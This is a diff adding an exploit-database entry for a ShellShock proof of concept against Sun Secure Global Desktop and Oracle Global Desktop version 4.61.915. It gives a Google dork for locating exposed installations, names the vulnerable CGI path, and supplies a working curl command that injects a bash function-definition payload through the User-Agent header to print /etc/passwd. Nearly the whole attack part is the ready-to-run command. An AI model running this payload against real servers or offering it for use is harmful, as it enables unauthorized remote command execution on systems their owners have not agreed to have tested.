@@ -1,0 +1,17 @@
+# Exploit Title: ShellShock On Sun Secure Global Desktop & Oracle Global desktop
+# Google Dork: intitle:Install the Sun Secure Global Desktop Native Client
+# Date: 6/4/2016
+# Exploit Author: lastc0de@outlook.com
+# Vendor Homepage: http://www.sun.com/ & http://www.oracle.com/
+# Software Link: http://www.oracle.com/technetwork/server-storage/securedesktop/downloads/index.html
+# Version: 4.61.915
+# Tested on: Linux
+
+VULNERABLE FILE
+http://target.com//tarantella/cgi-bin/modules.cgi
+
+POC :
+localhost@~#curl -A "() { :; }; echo; /bin/cat /etc/passwd" http://target.com/tarantella/cgi-bin/modules.cgi > xixixi.txt
+
+localhost@~#cat xixixi.txt
+which will print out the content of /etc/passwd file.
